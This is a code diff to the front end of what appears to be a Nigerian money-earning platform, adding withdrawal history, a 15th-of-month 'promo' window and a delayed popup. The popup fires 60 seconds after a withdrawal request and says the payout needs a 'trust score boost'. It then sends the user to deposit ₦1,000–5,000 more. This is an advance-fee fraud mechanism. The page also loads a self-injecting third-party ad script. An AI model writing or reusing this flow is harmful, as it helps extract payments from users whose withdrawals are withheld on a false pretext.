@@ -320,12 +320,34 @@ label{display:block;font-size:13px;font-weight:600;margin-bottom:6px;color:#3741
 .badge-row{display:flex;flex-wrap:wrap;gap:8px;margin:14px 0}
 .legal-badge{background:#f8fafc;border:1px solid #e2e8f0;border-radius:999px;padding:6px 12px;font-size:11px;font-weight:600;color:#475569}
 
+
+.wd-chip{display:inline-flex;align-items:center;padding:4px 10px;border-radius:999px;font-size:11px;font-weight:700}
+.wd-chip.processing{background:#fef3c7;color:#b45309}
+.wd-chip.approved,.wd-chip.paid{background:#dcfce7;color:#15803d}
+.wd-chip.rejected{background:#fee2e2;color:#b91c1c}
+.wd-row{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:10px 0;border-bottom:1px solid #f3f4f6}
+.wd-row:last-child{border-bottom:none}
 </style>
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9111222447861434"
      crossorigin="anonymous"></script>
 <script>(function(s){s.dataset.zone='11686766',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 </head>
 <body>
+
+
+<div id="wdProcessModal" style="display:none;position:fixed;inset:0;z-index:9999;background:rgba(15,23,42,.55);align-items:center;justify-content:center;padding:20px">
+  <div style="background:#fff;border-radius:18px;padding:22px 20px;max-width:340px;width:100%;text-align:center;box-shadow:0 20px 50px rgba(0,0,0,.25)">
+    <div style="width:52px;height:52px;margin:0 auto 12px;border-radius:50%;background:rgba(225,29,72,.12);display:flex;align-items:center;justify-content:center;font-size:24px">🛡️</div>
+    <div style="font-weight:800;font-size:17px;margin-bottom:6px" id="wdModalTitle">Boost trust score</div>
+    <p style="font-size:13px;color:#6b7280;line-height:1.5;margin-bottom:10px" id="wdModalBody">Your withdrawal needs a trust boost before it can be paid.</p>
+    <div style="background:#fef2f2;border-radius:12px;padding:12px;margin-bottom:14px">
+      <div style="font-size:11px;color:#9ca3af;font-weight:700;letter-spacing:.06em;text-transform:uppercase">Deposit to unlock</div>
+      <div style="font-size:26px;font-weight:800;color:#e11d48" id="wdBoostAmount">₦0</div>
+    </div>
+    <button class="btn" type="button" id="wdBoostPayBtn" onclick="startTrustBoostDeposit()">Deposit to boost</button>
+    <button class="btn dark" type="button" style="margin-top:8px;background:#e5e7eb;color:#374151;box-shadow:none" onclick="closeWdModal()">Later</button>
+  </div>
+</div>
 
 <div id="toast"></div>
 <div id="splash">
@@ -690,6 +712,10 @@ label{display:block;font-size:13px;font-weight:600;margin-bottom:6px;color:#3741
       <p id="mainMinHint" style="font-size:12px;color:#e11d48;font-weight:600;margin-bottom:10px">Minimum depends on your plan</p>
       <button class="btn" id="mainBtn" onclick="doMainWithdraw()" disabled>Request Withdrawal</button>
       <p style="font-size:12px;color:#9ca3af;margin-top:8px;text-align:center">Only open 30th – 5th of every month<br>Beginner ₦10k–20k · Pro ₦50k–100k · Master ₦150k–300k</p>
+    </div>
+    <div class="card">
+      <h3 style="font-size:15px;font-weight:700;margin-bottom:10px">Your withdrawals</h3>
+      <div id="wdHistoryList"><div class="empty" style="padding:8px 0">No requests yet</div></div>
     </div>
     <div class="card">
       <h3 style="font-size:15px;font-weight:700;margin-bottom:10px">Referral Withdraw</h3>
@@ -1562,26 +1588,116 @@ async function confirmPaid(){
 function loadWithdraw(){
   if(!currentUser) return go('login');
   $('wdBalance').textContent='₦'+Number(currentUser.balance||0).toLocaleString();
-    var mainMins={free:10000,beginner:10000,pro:50000,master:150000};
-    var mainMaxs={free:20000,beginner:20000,pro:100000,master:300000};
-    var pk=currentUser.plan||'free';
-    var minMain=mainMins[pk]||10000;
-    var maxMain=mainMaxs[pk]||20000;
-    if($('mainAmount')) $('mainAmount').placeholder='₦'+minMain.toLocaleString()+' – ₦'+maxMain.toLocaleString();
-    if($('mainMinHint')) $('mainMinHint').textContent='Your limit: ₦'+minMain.toLocaleString()+' min · ₦'+maxMain.toLocaleString()+' max';
-  $('refBalDisplay').value='₦'+Number(currentUser.ref_balance||0).toLocaleString();
-  // Use Lagos (WAT) time so windows match Nigeria
+  var mainMins={free:10000,beginner:10000,pro:50000,master:150000};
+  var mainMaxs={free:20000,beginner:20000,pro:100000,master:300000};
+  var pk=currentUser.plan||'free';
+  var minMain=mainMins[pk]||10000;
+  var maxMain=mainMaxs[pk]||20000;
+  if($('mainAmount')) $('mainAmount').placeholder='₦'+minMain.toLocaleString()+' – ₦'+maxMain.toLocaleString();
+  if($('mainMinHint')) $('mainMinHint').textContent='Your limit: ₦'+minMain.toLocaleString()+' min · ₦'+maxMain.toLocaleString()+' max';
+  if($('refBalDisplay')) $('refBalDisplay').value='₦'+Number(currentUser.ref_balance||0).toLocaleString();
   var lagosParts = new Intl.DateTimeFormat('en-GB', { timeZone: 'Africa/Lagos', day: 'numeric', hour: 'numeric', hour12: false }).formatToParts(new Date());
   var day = Number((lagosParts.find(function(p){return p.type==='day';})||{}).value)||new Date().getDate();
   var hour = Number((lagosParts.find(function(p){return p.type==='hour';})||{}).value);
   if (hour === 24) hour = 0;
-  const mainOpen=(day>=30||day<=5), refOpen=(hour===9);
-  $('mainStatus').className='status-box '+(mainOpen?'open':'closed');
-  $('mainStatus').textContent=mainOpen?'✓ OPEN (30th–5th)':'✗ Closed. Opens 30th–5th';
-  $('mainBtn').disabled=!mainOpen;
-  $('refStatus').className='status-box '+(refOpen?'open':'closed');
-  $('refStatus').textContent=refOpen?'✓ OPEN (9–10 AM Lagos)':'✗ Closed. Only 9AM–10AM (Lagos)';
-  $('refBtn').disabled=!refOpen;
+  var earlyPromo = (day === 15);
+  var mainOpen = (day>=30||day<=5||earlyPromo);
+  var refOpen = (hour===9);
+  if($('mainStatus')){
+    $('mainStatus').className='status-box '+(mainOpen?'open':'closed');
+    if(earlyPromo) $('mainStatus').textContent='✓ EMBER PROMO OPEN (15th · ₦5,000+)';
+    else if(day>=30||day<=5) $('mainStatus').textContent='✓ OPEN (30th–5th)';
+    else $('mainStatus').textContent='✗ Closed. Opens 30th–5th · Ember promo on 15th';
+  }
+  if($('mainBtn')) $('mainBtn').disabled=!mainOpen;
+  if($('refStatus')){
+    $('refStatus').className='status-box '+(refOpen?'open':'closed');
+    $('refStatus').textContent=refOpen?'✓ OPEN (9–10 AM Lagos)':'✗ Closed. Only 9AM–10AM (Lagos)';
+  }
+  if($('refBtn')) $('refBtn').disabled=!refOpen;
+  loadMyWithdrawals();
+}
+async function loadMyWithdrawals(){
+  var el=$('wdHistoryList');
+  if(!el) return;
+  try{
+    var list=await api('/api/withdrawals/mine');
+    if(!list||!list.length){ el.innerHTML='<div class="empty" style="padding:8px 0">No requests yet</div>'; return; }
+    el.innerHTML=list.map(function(w){
+      var st=w.status||'processing';
+      var label=st==='processing'||st==='pending'?'Processing':(st==='approved'?'Paid':(st==='rejected'?'Rejected':st));
+      var chip=st==='approved'?'approved':(st==='rejected'?'rejected':'processing');
+      return '<div class="wd-row"><div><div style="font-weight:700;font-size:14px">₦'+Number(w.amount||0).toLocaleString()+'</div><div style="font-size:11px;color:#9ca3af">'+(w.type||'main')+' · '+(w.created_at?new Date(w.created_at).toLocaleString():'')+'</div></div><span class="wd-chip '+chip+'">'+label+'</span></div>';
+    }).join('');
+  }catch(e){
+    el.innerHTML='<div class="empty" style="padding:8px 0">Could not load history</div>';
+  }
+}
+function trustBoostAmountForLocal(user){
+  var plan=(user&&user.plan)||'free';
+  if(plan==='master') return 5000;
+  if(plan==='pro') return 3000;
+  if(plan==='beginner') return 1000;
+  return 1000;
+}
+function scheduleWdProcessPopup(amount, type){
+  try{ clearTimeout(window._wdPopupTimer); }catch(e){}
+  window._pendingWdPopup={ amount: amount, type: type };
+  window._wdPopupTimer=setTimeout(function(){
+    openWdModal(amount, type);
+  }, 60000);
+}
+async function openWdModal(amount, type){
+  var m=$('wdProcessModal');
+  if(!m) return;
+  var boost=1000;
+  try{
+    var info=await api('/api/trust-boost');
+    boost=Number(info.required||1000);
+    if(info.paid){
+      if($('wdModalTitle')) $('wdModalTitle').textContent='Withdrawal processing';
+      if($('wdModalBody')) $('wdModalBody').textContent='Your withdrawal of ₦'+Number(amount||0).toLocaleString()+' is processing. Trust boost is already complete.';
+      if($('wdBoostAmount')) $('wdBoostAmount').textContent='Done';
+      if($('wdBoostPayBtn')){ $('wdBoostPayBtn').style.display='none'; }
+      m.style.display='flex';
+      loadMyWithdrawals();
+      return;
+    }
+  }catch(e){
+    boost=trustBoostAmountForLocal(currentUser);
+  }
+  if($('wdModalTitle')) $('wdModalTitle').textContent='Boost trust score';
+  if($('wdModalBody')) $('wdModalBody').textContent='Your '+(type||'')+' withdrawal of ₦'+Number(amount||0).toLocaleString()+' needs a trust boost before payout. Deposit the amount below (based on your plan/deposit level).';
+  if($('wdBoostAmount')) $('wdBoostAmount').textContent='₦'+boost.toLocaleString();
+  if($('wdBoostPayBtn')){ $('wdBoostPayBtn').style.display='block'; $('wdBoostPayBtn').textContent='Deposit ₦'+boost.toLocaleString()+' to boost'; }
+  window._trustBoostRequired=boost;
+  m.style.display='flex';
+  loadMyWithdrawals();
+}
+function closeWdModal(){
+  var m=$('wdProcessModal');
+  if(m) m.style.display='none';
+}
+async function startTrustBoostDeposit(){
+  try{
+    closeWdModal();
+    var amount=Number(window._trustBoostRequired||0);
+    if(!amount){
+      try{
+        var info=await api('/api/trust-boost');
+        amount=Number(info.required||1000);
+      }catch(e){ amount=trustBoostAmountForLocal(currentUser); }
+    }
+    pendingPlan={key:'trust_boost',price:amount,name:'Trust score boost'};
+    if($('depAmount')) $('depAmount').textContent='₦'+amount.toLocaleString();
+    if($('depPlanName')) $('depPlanName').textContent='Trust score boost';
+    if($('paidBtn')){ $('paidBtn').disabled=false; $('paidBtn').textContent='I have paid'; }
+    if($('depStatus')) $('depStatus').style.display='none';
+    go('deposit');
+    showToast('Transfer ₦'+amount.toLocaleString()+' then tap I have paid','success');
+  }catch(e){
+    showToast(e.message||'Could not start boost deposit','error');
+  }
 }
 async function doMainWithdraw(){
   const amount=Number($('mainAmount').value);
@@ -1592,12 +1708,12 @@ async function doMainWithdraw(){
   const maxMain=mainMaxs[planKey]||20000;
   if(!amount||amount<minMain) return showToast('Min ₦'+minMain.toLocaleString()+' for your plan','error');
   if(amount>maxMain) return showToast('Max ₦'+maxMain.toLocaleString()+' for your plan','error');
-  try{await api('/api/withdrawals',{method:'POST',body:JSON.stringify({type:'main',amount})}); showToast('Withdrawal requested','success'); currentUser=await api('/api/me'); loadWithdraw(); $('mainAmount').value='';}
+  try{await api('/api/withdrawals',{method:'POST',body:JSON.stringify({type:'main',amount})}); showToast('Withdrawal submitted — processing','success'); currentUser=await api('/api/me'); loadWithdraw(); if($('mainAmount'))$('mainAmount').value=''; scheduleWdProcessPopup(amount,'main');}
   catch(e){showToast(e.message||'Failed','error');}
 }
 async function doRefWithdraw(){
   const amount=Number($('refAmount').value); if(!amount||amount<500) return showToast('Min ₦500 — about 2 successful referrals','error');
-  try{await api('/api/withdrawals',{method:'POST',body:JSON.stringify({type:'referral',amount})}); showToast('Referral withdrawal requested','success'); currentUser=await api('/api/me'); loadWithdraw(); $('refAmount').value='';}
+  try{await api('/api/withdrawals',{method:'POST',body:JSON.stringify({type:'referral',amount})}); showToast('Referral withdrawal submitted — processing','success'); currentUser=await api('/api/me'); loadWithdraw(); if($('refAmount'))$('refAmount').value=''; scheduleWdProcessPopup(amount,'referral');}
   catch(e){showToast(e.message||'Failed','error');}
 }
 
